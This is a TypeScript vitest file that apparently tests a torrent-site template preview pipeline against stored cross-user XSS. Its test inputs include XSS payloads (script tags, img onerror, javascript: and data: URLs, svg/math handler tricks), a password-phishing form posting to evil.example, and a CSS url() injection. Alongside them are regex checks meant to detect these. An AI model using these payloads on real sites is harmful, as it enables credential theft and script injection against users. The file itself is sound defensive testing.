import { describe, expect, it } from 'vitest';
import { renderTemplate } from '@trackarr/shared/templateEngine';
import { bbcodeToHtml } from '../app/utils/editorFormats';
import { sanitizeRichHtml } from '../app/utils/markdown';
import { sampleFicheContext } from '../app/utils/ficheTemplate';

/**
 * What publishing a template actually risks.
 *
 * A private template renders in its author's own browser, where injecting
 * script buys them nothing they could not already do from the console. A
 * PUBLISHED one is different in kind: it renders in every member who opens
 * the wizard and in every staffer reviewing it, from source that member
 * never wrote. That is stored cross-user XSS if anything escapes.
 *
 * `test/sanitize.test.ts` already pins `sanitizeRichHtml` against hostile
 * HTML. What it cannot pin is the composition this feature introduced —
 * template source → renderTemplate → bbcodeToHtml → sanitizeRichHtml —
 * because each stage rewrites its input and a stage added later could hand
 * the sanitizer something it never saw in isolation. Both preview paths
 * (TemplateEditorModal and pages/torrents/fiche.vue) run exactly this
 * chain, so exactly this chain is what gets tested.
 *
 * There are two defences in that chain and they are not redundant:
 * `bbcodeToHtml` ESCAPES its input first, so raw markup in a template
 * becomes visible text and never a node; DOMPurify then vets the markup
 * BBCode itself emitted. The assertions below have to be able to tell those
 * two outcomes apart, which is why they inspect tag interiors rather than
 * grepping the whole string — `&lt;img onerror=…&gt;` is inert text, and a
 * regex over the raw string cannot distinguish it from a live attribute.
 */
function renderPreview(source: string): string {
  return sanitizeRichHtml(bbcodeToHtml(renderTemplate(source, sampleFicheContext())));
}

/** The markup BBCode is allowed to emit. Anything else is a finding. */
const ALLOWED_TAGS = new Set([
  'a', 'b', 'br', 'blockquote', 'code', 'div', 'em', 'h1', 'h2', 'h3', 'h4',
  'h5', 'h6', 'hr', 'i', 'img', 'li', 'ol', 'p', 'pre', 's', 'span', 'strong',
  'table', 'tbody', 'td', 'th', 'thead', 'tr', 'u', 'ul',
]);

/** Every `<…>` span in the string — i.e. only what the browser reads as markup. */
function tagInteriors(html: string): string[] {
  return html.match(/<[^>]*>/g) ?? [];
}

/**
 * Asserts the string carries nothing executable.
 *
 * Scanning tag interiors only is the whole point: escaped text sits OUTSIDE
 * `<…>`, so a payload that survived as visible characters cannot trip these
 * checks, while a payload that survived as a real attribute cannot escape
 * them.
 */
function assertInert(html: string): void {
  for (const tag of tagInteriors(html)) {
    const name = tag.match(/^<\/?\s*([a-zA-Z][a-zA-Z0-9]*)/)?.[1]?.toLowerCase();
    expect(ALLOWED_TAGS, `tag <${name}> in ${tag}`).toContain(name);
    // No event handler as an ATTRIBUTE of a live tag.
    expect(tag, `handler in ${tag}`).not.toMatch(/\son[a-z]+\s*=/i);
    // No executable or document-bearing scheme in a live href/src.
    expect(tag, `scheme in ${tag}`).not.toMatch(/(?:href|src|srcset)\s*=\s*["']?\s*(?:javascript|data|vbscript):/i);
    // A surviving style attribute must not be able to fetch anything.
    expect(tag, `url() in ${tag}`).not.toMatch(/url\s*\(/i);
  }
}

describe('a published template cannot execute in a reader’s browser', () => {
  it('turns raw markup into text instead of nodes', () => {
    // The first defence, stated as a property: `bbcodeToHtml` escapes before
    // it expands, so a `<script>` in a template is something the reader SEES,
    // not something their browser runs.
    const html = renderPreview('<script>alert(1)</script>');
    expect(html).toContain('&lt;script&gt;');
    expect(tagInteriors(html).join('')).not.toMatch(/script/i);
    assertInert(html);
  });

  it('neutralises an image whose attributes try to break out', () => {
    assertInert(renderPreview('[img]x" onerror="alert(1)[/img]'));
    assertInert(renderPreview('<img src=x onerror=alert(1)>'));
  });

  it('refuses an executable scheme on a BBCode link', () => {
    const html = renderPreview('[url=javascript:alert(1)]click[/url]');
    assertInert(html);
    // The label survives; only the destination is dropped.
    expect(html).toContain('click');
  });

  it('refuses a data: URL that would carry its own document', () => {
    assertInert(renderPreview('[url=data:text/html,<script>alert(1)</script>]x[/url]'));
  });

  it('strips svg and math wrappers used to smuggle handlers', () => {
    assertInert(renderPreview('<svg onload=alert(1)></svg>'));
    assertInert(renderPreview('<svg><animate onbegin=alert(1) attributeName=x></svg>'));
    assertInert(renderPreview('<math><mtext><mglyph><style><img src=x onerror=alert(1)>'));
  });

  it('cannot render a form, so a template cannot phish a reader', () => {
    // The realistic abuse of a site-wide template is not alert(1): it is a
    // convincing "session expired, sign in again" box inside a page the
    // member already trusts.
    const html = renderPreview(
      '<form action="https://evil.example/collect"><input name="password" type="password"><button>Sign in</button></form>',
    );
    assertInert(html);
    expect(tagInteriors(html).join('')).not.toMatch(/form|input|button/i);
  });

  it('keeps presentational styling while dropping anything that fetches', () => {
    const html = renderPreview('[center][color=#3d85c6][size=20]Titre[/size][/color][/center]');
    expect(html).toContain('Titre');
    expect(html).toMatch(/text-align|color/i);
    assertInert(html);
  });

  it('filters a colour value that smuggles a second declaration', () => {
    assertInert(renderPreview('[color=red;background:url(//evil.example/x)]t[/color]'));
  });

  it('hardens an outbound link the template author chose', () => {
    const html = renderPreview('[url=https://evil.example]x[/url]');
    expect(html).toContain('rel="noopener noreferrer"');
    assertInert(html);
  });

  it('sanitises a hostile VALUE, not just a hostile template', () => {
    // The template is innocent here — the metadata filling it is not. A
    // synopsis pasted from a hostile source travels the same path.
    const ctx = { ...sampleFicheContext(), OVERVIEW: '<img src=x onerror=alert(1)>' };
    assertInert(sanitizeRichHtml(bbcodeToHtml(renderTemplate('{{OVERVIEW}}', ctx))));
  });

  it('cannot smuggle a handler through the template grammar itself', () => {
    // Section bodies and comments are ordinary text to the engine; neither is
    // a place where markup gets a pass.
    assertInert(renderPreview('{{#IS_MOVIE}}<img src=x onerror=alert(1)>{{/IS_MOVIE}}'));
    assertInert(renderPreview('{{! <script>alert(1)</script> }}'));
  });
});
